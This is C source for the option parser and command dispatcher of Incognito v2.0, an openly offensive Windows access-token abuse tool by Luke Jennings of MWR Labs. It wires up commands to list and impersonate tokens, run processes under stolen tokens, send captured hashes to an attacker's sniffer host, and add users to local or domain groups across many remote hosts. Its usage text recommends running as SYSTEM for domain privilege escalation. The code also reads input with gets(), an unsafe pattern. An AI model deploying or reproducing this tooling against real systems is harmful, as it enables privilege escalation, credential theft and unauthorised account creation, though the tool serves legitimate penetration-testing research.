/*
Software License Agreement (BSD License)

Copyright (c) 2006, Luke Jennings (0xlukej@gmail.com)
All rights reserved.

Redistribution and use of this software in source and binary forms, with or without modification, are
permitted provided that the following conditions are met:

* Redistributions of source code must retain the above
  copyright notice, this list of conditions and the
  following disclaimer.

* Redistributions in binary form must reproduce the above
  copyright notice, this list of conditions and the
  following disclaimer in the documentation and/or other
  materials provided with the distribution.

* Neither the name of Luke Jennings nor the names of its
  contributors may be used to endorse or promote products
  derived from this software without specific prior
  written permission of Luke Jennings.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED
WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/
#define _CRT_SECURE_NO_DEPRECATE 1
#include <windows.h>
#include <stdio.h>
#include "child_process.h"
#include "user_management.h"
#include "token_info.h"
#include "process_execution.h"
#include "hash_stealer.h"
#include "list_tokens.h"
#include "remote_connection.h"
#include "handle_arguments.h"
#include "XGetopt.h"

static DWORD WINAPI NewRemoteConnectionThread(LPVOID p);
static DWORD WINAPI NewRemoteConnectionThreadWithCreds(LPVOID p);

static HANDLE threadSemaphore; 
static HANDLE threadMutex;
static int threadCount=0;

void output_string(char *string, ...)
{
	DWORD dwWritten;
	va_list ap;
	char temp[2048];

	va_start(ap, string);
	if (_vsnprintf(temp, sizeof(temp), string, ap) == -1)
		temp[sizeof(temp)-1] = '\0';

	if (hOUTPUT == stdout)
		printf("%s", temp);
	else
		WriteFile(hOUTPUT, temp, strlen(temp), &dwWritten, NULL);

	va_end(ap);
}

void output_status_string(char *string, ...)
{
	char *host = remote_host;
	DWORD dwWritten;
	va_list ap;
	char temp[2048];

	if (suppress_status)
		return;

	va_start(ap, string);
	if (_vsnprintf(temp, sizeof(temp), string, ap) == -1)
		temp[sizeof(temp)-1] = '\0';

	if (hOUTPUT == stdout)
	{
		if (grepable_mode)
			printf("%s / [Status] / ", host);
		printf("%s", temp);
	}
	else
	{
		if (grepable_mode)
		{
			WriteFile(hOUTPUT, host, strlen(host), &dwWritten, NULL);
			WriteFile(hOUTPUT, " / [Status] / ", strlen(" / [Status] / "), &dwWritten, NULL);
		}
		WriteFile(hOUTPUT, temp, strlen(temp), &dwWritten, NULL);
	}

	va_end(ap);
}

void output_grepable_string(char *string, ...)
{
	char *host = remote_host;
	DWORD dwWritten;
	va_list ap;
	char temp[2048];

	va_start(ap, string);
	if (_vsnprintf(temp, sizeof(temp), string, ap) == -1)
		temp[sizeof(temp)-1] = '\0';

	if (hOUTPUT == stdout)
		printf("%s / %s", host, temp);
	else
	{	
		WriteFile(hOUTPUT, host, strlen(host), &dwWritten, NULL);
		WriteFile(hOUTPUT, " / ", strlen(" / "), &dwWritten, NULL);
		WriteFile(hOUTPUT, temp, strlen(temp), &dwWritten, NULL);
	}

	va_end(ap);
}

BOOL output_counted_string(char *string, DWORD dwRead)
{
	DWORD dwWritten;

	if (hOUTPUT == stdout)
		return fwrite(string, sizeof(char), dwRead, hOUTPUT);
	else
		return WriteFile(hOUTPUT, string, dwRead, &dwWritten, NULL);
}

BOOL read_counted_input(char *string, int string_size, DWORD *dwRead)
{
	char *ret_value;

	if (hINPUT == stdin)
	{
		ret_value = gets(string);
		*dwRead = strlen(string)+1;
		return (BOOL)ret_value;
	}
	else
		return ReadFile(hINPUT, string, string_size, dwRead, NULL);
}

void print_error_if_system()
{
	if (!is_local_system())
		output_string("[-] WARNING: Not running as SYSTEM. Not all tokens will be available.\n");
}

void usage(char *programName)
{
	output_string("\nIncognito v2.0, by Luke Jennings (0xlukej@gmail.com)\n");
	output_string("=========================================================\n\n");
	output_string("MWR Labs project page: http://labs.mwrinfosecurity.com/research-projects/security-implications-of-windows-access-tokens/\n\n");
	output_string("Whitepaper: http://labs.mwrinfosecurity.com/assets/142/mwri_security-implications-of-windows-access-tokens_2008-04-14.pdf\n\n\n");

	output_string("Usage:\n\n");
	output_string("%s [global options] COMMAND [options] arguments\n", programName);
	output_string("\n\n");


	output_string("GLOBAL OPTIONS:\n\n");
	output_string("\t-h <host>\tOperate on remote host\n");
	output_string("\t-f <filename>\tOperate on remote hosts loaded from text file\n");
	output_string("\t-u <username>\tUsername to use remotely\n");
	output_string("\t-p <password>\tPassword to use remotely\n");
	output_string("\t-n <threads>\tMax number of threads\n");
	output_string("\t-g \t\tGrepable output mode\n");
	output_string("\t-q \t\tQuiet mode (suppress status messages)\n");
	output_string("\n\n");


	output_string("COMMANDS:\n\n");
	output_string("\tlist_tokens [options]\t\n\n");
	output_string("\t\t-u\tList by unique username\n");
	output_string("\t\t-g\tList by unique groupname\n");
	output_string("\n");

	output_string("\texecute [options] <token> <command>\t\n\n");
	output_string("\t\t-c\tEnable communication by console\n");
	output_string("\n");

	output_string("\tsnarf_hashes <sniffer_host>\t\n\n");

	output_string("\tadd_user [options] <username> <password>\t\n\n");
	output_string("\t\t-h <host>\tAdd user to remote host\n");
	output_string("\n");

	output_string("\tadd_group_user [options] <groupname> <username>\t\n\n");
	output_string("\t\t-h <host>\tAdd user to group on remote host\n");
	output_string("\n");

	output_string("\tadd_localgroup_user [options] <groupname> <username>\t\n\n");
	output_string("\t\t-h <host>\tAdd user to group on remote host\n");
	output_string("\n");

	output_string("\tcleanup\n\n");

	output_string("\n");


	output_string("TIPS:\n\n");
	output_string("\t- Run as SYSTEM when using locally for domain privilege escalation\n");
	output_string("\t- Run as a standard user when using remotely (-h or -f global options)\n");
	output_string("\t- Remember to enclose arguments with spaces in them within quotation marks\n");
}

static BOOL user_supplied = FALSE, pass_supplied = FALSE;
static char username[BUF_SIZE], password[BUF_SIZE];
static int argc_global;
static char **argv_global;
static BOOL cleanup_mode = FALSE;

void handle_options(int argc, char *argv[])
{	
	int c, MAX_THREADS = 10;
	FILE *fp;
	char *command, host_to_add_user[BUF_SIZE] = "127.0.0.1", filename[BUF_SIZE], file_line[BUF_SIZE], *thread_specific_host = NULL;
	BOOL connect_remotely = FALSE, console_mode = FALSE, file_mode = FALSE;

	argc_global = argc;
	argv_global = argv;
	grepable_mode = FALSE;
	suppress_status = FALSE;
	strcpy(remote_host, "127.0.0.1");

	// Parse global incognito options
	while ((c = getopt(argc, argv, "f:h:u:p:n:gq")) != -1)
	{
		switch (c) 
		{		
			case 'u': 
			{
				user_supplied = TRUE;
				strncpy(username, optarg, BUF_SIZE); 
				username[BUF_SIZE-1] = '\0';
				break;
			}
			case 'p': 
			{
				pass_supplied = TRUE;
				strncpy(password, optarg, BUF_SIZE); 
				password[BUF_SIZE-1] = '\0';
				break;
			}
			case 'h': 
			{
				if (!override_connect_remotely)
					connect_remotely = TRUE;
				strncpy(remote_host, optarg, BUF_SIZE); 
				remote_host[BUF_SIZE-1] = '\0';
				break;
			}
			case 'f':
			{
				if (!override_connect_remotely)
					connect_remotely = TRUE;
				file_mode = TRUE;
				strncpy(filename, optarg, BUF_SIZE); 
				filename[BUF_SIZE-1] = '\0';
				break;
			}
			case 'g':
			{
				grepable_mode = TRUE;
				break;
			}
			case 'q':
			{
				suppress_status = TRUE;
				break;
			}
			case 'n': MAX_THREADS = atoi(optarg); break;
			case '?': output_string("[-] Unknown global option %s\n", argv[optind-1]); return;
			case ':': output_string("[-] %s option argument was not supplied\n", argv[optind-1]); return;
		}	
	}

	// Setup thread control
	threadSemaphore = CreateSemaphore(NULL, MAX_THREADS, MAX_THREADS, NULL);  
	threadMutex = CreateMutex(NULL, FALSE, NULL);

	if (connect_remotely)
	{
		if (!_stricmp("cleanup", ((argv_global+optind)-1)[1]))
			cleanup_mode = TRUE;

		if (is_local_system())
			output_status_string("[-] WARNING: Running as SYSTEM. This will fail as SYSTEM cannot authenticate remotely. Run as a standard user.\n");
		
		if (optind >= argc)
		{
			output_status_string("[-] No arguments supplied to be passed to remote service\n");
			return;
		}

		if (file_mode)
		{
			fp = fopen(filename, "r");
			if (fp == NULL)
			{
				output_status_string("[-] Invalid Filename\n");
				return;
			}

			while (fgets(file_line, sizeof(file_line)-1, fp))
			{
				sscanf(file_line, "%s\n", remote_host);
				thread_specific_host = (char*)calloc(strlen(remote_host)+1, sizeof(char));
				strcpy(thread_specific_host, remote_host);

				if (user_supplied && pass_supplied)
				{
					WaitForSingleObject(threadSemaphore, INFINITE);   
					WaitForSingleObject(threadMutex, INFINITE);
					threadCount += 1;
					ReleaseMutex(threadMutex);

					CreateThread(
						NULL,              // default security attributes
						0,                 // use default stack size
						NewRemoteConnectionThreadWithCreds,        // thread function
						thread_specific_host,             // argument to thread function
						0,                 // use default creation flags
						NULL);   // returns the thread identifier
				}
				else if (!user_supplied && !pass_supplied)
				{
					WaitForSingleObject(threadSemaphore, INFINITE);   
					WaitForSingleObject(threadMutex, INFINITE);
					threadCount += 1;
					ReleaseMutex(threadMutex);

					CreateThread(
						NULL,              // default security attributes
						0,                 // use default stack size
						NewRemoteConnectionThread,        // thread function
						thread_specific_host,             // argument to thread function
						0,                 // use default creation flags
						NULL);   // returns the thread identifier
				}
				else
					output_status_string("[-] Please supply either both username and password or neither when connecting remotely\n");


			}

			while(threadCount > 0)
				Sleep(100);

			return;
		}

		if (user_supplied && pass_supplied)
			connect_to_machine(remote_host, username, password, (argc-optind)+1, (argv+optind)-1, cleanup_mode);
		else if (!user_supplied && !pass_supplied)
			connect_to_machine(remote_host, NULL, NULL, (argc-optind)+1, (argv+optind)-1, cleanup_mode);
		else
			output_status_string("[-] Please supply either both username and password or neither when connecting remotely\n");

		return;
	}

	// Set incognito command (list_tokens, execute, snarf_hashes etc)
	if (optind < argc)
		command = argv[optind];

	// Increment optind to point to command specific options and arguments
	optind += 1;

	if (!is_local_system())
		output_status_string("[-] WARNING: Not running as SYSTEM. Not all tokens will be available.\n");

	// Handle each different command
	if (!_stricmp("list_tokens", command))
	{
		while ((c = getopt(argc, argv, "ug")))
		{
			switch (c) 
			{		
				case 'u':	list_unique_tokens(BY_USER); return;
				case 'g':	list_unique_tokens(BY_GROUP); return;
				case EOF:	output_string("[-] No list_tokens command options specified\n"); return;
				default:	output_string("[-] Unknown list_tokens command option\n"); return;
			}	
		}
	}
	else if (!_stricmp("execute", command))
	{
		while ((c = getopt(argc, argv, "c")) != -1)
		{
			switch (c) 
			{		
				case 'c':	console_mode = TRUE; break;
				default:	output_string("[-] Unknown execute command option\n"); return;
			}	
		}

		// Check enough arguments supplied
		if (argc - optind < 2)
		{	
			output_string("[-] Not enough arguments supplied to execute command\n");
			return;
		}

		execute_process_with_primary_token(argv[optind], argv[optind+1], console_mode);
		return;
	}
	else if (!_stricmp("snarf_hashes", command))
	{
		// Check enough arguments supplied
		if (argc - optind < 1)
		{
			output_string("[-] Not enough arguments supplied to snarf_hashes command\n");
			return;
		}

		snarf_hashes(argv[optind]);
	}
	else if (!_stricmp("add_user", command) || !_stricmp("add_localgroup_user", command) || !_stricmp("add_group_user", command))
	{
		while ((c = getopt(argc, argv, "h:")) != -1)
		{
			switch (c) 
			{		
				case 'h':	
				{
					strncpy(host_to_add_user, optarg, BUF_SIZE);
					host_to_add_user[BUF_SIZE-1] = '\0';
					break;
				}
				case ':':	output_string("[-] list_tokens %s option argument was not supplied\n", argv[optind-1]); return;
				default:	output_string("[-] Unknown add_user command option\n"); return;
			}	
		}

		// Check enough arguments supplied
		if (argc - optind < 2)
		{	
			output_string("[-] Not enough arguments supplied to command\n");
			return;
		}

		if (!_stricmp("add_user", command))
			add_user(host_to_add_user, argv[optind], argv[optind+1]);
		else if (!_stricmp("add_localgroup_user", command))
			add_user_to_localgroup(host_to_add_user, argv[optind], argv[optind+1]);
		else if (!_stricmp("add_group_user", command))
			add_user_to_group(host_to_add_user, argv[optind], argv[optind+1]);

		return;
	}
	else if (!_stricmp("cleanup", command))
		output_string("[-] cleanup command not valid in this context. Needs to be a remote connection\n");
	else
		output_string("[-] Unknown command %s\n", command);
	
	return;
}

static DWORD WINAPI NewRemoteConnectionThreadWithCreds(LPVOID p)
{
	connect_to_machine(p, username, password, (argc_global-optind)+1, (argv_global+optind)-1, cleanup_mode);
	
	WaitForSingleObject(threadMutex, INFINITE);
	threadCount -= 1;
	ReleaseMutex(threadMutex);

	ReleaseSemaphore(threadSemaphore, 1, NULL);
	return 0;
}

static DWORD WINAPI NewRemoteConnectionThread(LPVOID p)
{
	connect_to_machine(p, NULL, NULL, (argc_global-optind)+1, (argv_global+optind)-1, cleanup_mode);

	WaitForSingleObject(threadMutex, INFINITE);
	threadCount -= 1;
	ReleaseMutex(threadMutex);

	ReleaseSemaphore(threadSemaphore, 1, NULL);
	return 0;
}